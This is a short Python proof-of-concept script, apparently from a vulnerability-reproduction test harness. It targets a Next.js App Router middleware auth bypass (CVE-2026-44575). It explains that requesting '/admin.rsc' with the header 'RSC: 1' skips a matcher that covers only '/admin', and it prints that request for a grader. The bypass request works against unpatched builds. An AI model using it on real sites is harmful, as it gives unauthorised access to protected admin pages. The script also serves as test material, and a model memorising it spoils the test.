#!/usr/bin/env python3
"""
Original bypass — CVE-2026-44575 (GHSA-267c-6grr-h53f).

App Router serves the middleware-protected /admin page at transport-variant paths
(/admin.rsc and /admin.segments/....segment.rsc). On an unpatched build the
middleware `matcher` compiled from `config.matcher = ["/admin"]` only covers the
human-facing /admin path, so an unauthenticated request to the transport variant
skips the auth gate and the protected page (with ${PCB_FLAG}) is returned.

  v0 (15.2.0 webpack)  -> REACHES (no fix; matcher lacks .rsc)
  v1_web (15.5.16 webpack) -> BLOCKED (CVE-2026-44575 fix; matcher covers .rsc)

Platform convention: stdout prints a JSON candidate consumed by poc/seed_exec.py
(GET /admin.rsc with the RSC:1 header). The residual (CVE-2026-45109, Turbopack
pipeline) uses the SAME request against the v1_turbo service — scripts/verify.sh
switches the target service per mode, not the payload.
"""
import json


def candidate():
    return {
        "probe_id": "cve-2026-44575-admin-rsc",
        "path": "/admin.rsc",
        "headers": {"RSC": "1"},
    }


if __name__ == "__main__":
    import sys
    _ = sys.argv  # original_poc.py <version> — 版本参数仅占位
    print(json.dumps(candidate()))
